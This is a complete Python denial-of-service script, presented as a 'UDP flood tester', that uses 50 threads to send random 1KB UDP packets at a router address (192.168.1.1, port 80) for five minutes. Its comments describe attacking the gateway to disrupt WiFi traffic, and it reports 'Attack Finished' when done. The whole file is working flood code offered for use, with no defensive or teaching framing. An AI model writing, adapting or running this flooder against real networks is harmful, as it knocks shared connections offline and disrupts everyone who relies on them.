import socket
import random
import time
import os
import sys
import threading

# ==================== CONFIGURATION ====================
TARGET_IP = "192.168.1.1"  # Attack the ROUTER (Gateway) to force WiFi traffic
TARGET_PORT = 80           # HTTP Port
PACKET_SIZE = 1024         # 1KB per packet
THREADS = 50               # Number of threads (Parallel canons)
DURATION = 300              # Attack duration (seconds)
# =======================================================

# Generate random bytes
def random_bytes(size):
    return os.urandom(size)

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP Socket
    bytes_to_send = random_bytes(PACKET_SIZE)
    end_time = time.time() + DURATION
    
    packets_sent = 0
    while time.time() < end_time:
        try:
            sock.sendto(bytes_to_send, (TARGET_IP, TARGET_PORT))
            packets_sent += 1
            # Small delay to prevent crushing your own PC CPU completely
            # time.sleep(0.0001) 
        except Exception as e:
            pass
            
    print(f"Thread finished. Sent {packets_sent} packets.")

def start_attack():
    print(f"╔════════════════════════════════════╗")
    print(f"║   🚀 UDP FLOOD TESTER v1.0         ║")
    print(f"╚════════════════════════════════════╝")
    print(f"🎯 Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"📦 Size: {PACKET_SIZE} bytes")
    print(f"🧵 Threads: {THREADS}")
    print(f"⏱️ Duration: {DURATION}s")
    print(f"\n⚡ FLOODING NOW... (Press Ctrl+C to stop)")
    
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=udp_flood)
        t.daemon = True  # Kill thread if main program exits
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
        
    print("\n✅ Attack Finished.")

if __name__ == "__main__":
    try:
        start_attack()
    except KeyboardInterrupt:
        print("\n🛑 Attack Stopped by User.")
        sys.exit()
